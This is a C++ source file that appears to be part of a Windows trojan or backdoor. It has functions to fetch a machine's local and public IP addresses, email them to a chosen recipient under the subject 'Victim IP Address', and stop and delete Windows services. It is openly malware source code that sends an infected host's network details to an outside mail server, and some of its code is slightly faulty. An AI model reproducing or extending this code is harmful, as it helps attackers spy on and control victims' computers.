//-------------------------------------------------------------
//                  ServerFunctions.cpp
//-------------------------------------------------------------
//-------------------------------------------------------------
#include "ServerFunctions.h"
#include "ClientMailSocket_t.h"
#include "SocketException_t.h"
#include "ProcessManager_t.h"
#include <fstream>   // using file streams
//==============================================================================
void SMTP_Handle(const char* serverName,const char* RcpAddrs,const string data,const string Sender,const int Port)
{
	string buff;
	
	//Create Client socket.
	ClientMailSocket_t client_socket(Port,serverName);  
	
	client_socket<<"MAIL FROM :"<<Sender<<"\n";
	client_socket<<"RCPT TO :"<<RcpAddrs<<"\n";
	client_socket<<"DATA\n";
	client_socket<<"subject: "<<"Victim IP Address"<<"\n";
	client_socket<<data<<"\n";
	client_socket<<".\n";
	client_socket<<"quit\n";
}
//--------------------------------------------------------------------
bool DeleteWinService(const char* SrvName)
{
	SERVICE_STATUS ss;
	SC_HANDLE hSrv;
	
	//Open the Service Control Manager
	SC_HANDLE sc = OpenSCManager (NULL,NULL,SC_MANAGER_ALL_ACCESS);
	
	//Check if OpenSCManager returns NULL. Otherwise proceed
	if (sc != NULL)
	{
		//Open the Service
		hSrv = OpenService(sc,SrvName,DELETE);
		if (hSrv != NULL)
		{
			//Stop the service- if stop didnt work,
			//the deleletion will be after restarting the system.
			ControlService(hSrv,SERVICE_CONTROL_STOP,&ss);
			//delete the service
			if(!DeleteService(hSrv))
			{
				CloseServiceHandle (hSrv);
				CloseServiceHandle(sc);
				return false;
			}
		}
		
	}
	CloseServiceHandle (hSrv);
	CloseServiceHandle(sc);
	return true;
}
//====================================================================
bool getExternIP(string &ip)
{
	HINTERNET Hopen,HUrl; //Handles for Internet/URL Open
	string url_ip= "http://www.geekpedia.com/ip.php"; //URL which returns the ip address
	char pData[256]; 
	DWORD bytesRead;
	
	
	//open internet and get handle
	Hopen = InternetOpen("", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0 );
	if (Hopen != NULL)
	{
		//open URL and get handle
		HUrl = InternetOpenUrl(Hopen,url_ip.c_str(),NULL,0,INTERNET_FLAG_EXISTING_CONNECT,0);
		if(HUrl != NULL)
		{
			//read file from URL 
			if (InternetReadFile(HUrl,pData,(sizeof(pData)),&bytesRead) == TRUE )
			{
				ip.assign(pData,bytesRead);
				
				InternetCloseHandle(HUrl);
				InternetCloseHandle(Hopen);
				return true;
			}
			InternetCloseHandle(HUrl);
			InternetCloseHandle(Hopen);
		}
		InternetCloseHandle(Hopen);
	}
	
	return false;
	
}
//====================================================================
bool getLocalIP(string &ip)
{
	char hostname[100];
    string tmp;   
	WORD wVersionRequested;
	WSADATA wsaData;
	int err;
	
	wVersionRequested = MAKEWORD(2,2);
	err = WSAStartup(wVersionRequested, &wsaData);
	
	if (err == 0)
	{
		
		
		int ret = gethostname(hostname, sizeof(hostname));
		if (ret == 0)
		{
			struct hostent *ht = gethostbyname(hostname);
			if(ht != 0)
			{
				tmp.append(inet_ntoa(*((struct in_addr *)ht->h_addr_list[0])));
				ip.assign(tmp);
				return true;
			}
		}
		
		WSACleanup();
	}
	return false;
}

//=============================================================================
void WINAPI Handler( DWORD fdwControl )
{
	if( fdwControl == SERVICE_CONTROL_SHUTDOWN )
		ExitProcess( 0 );  
}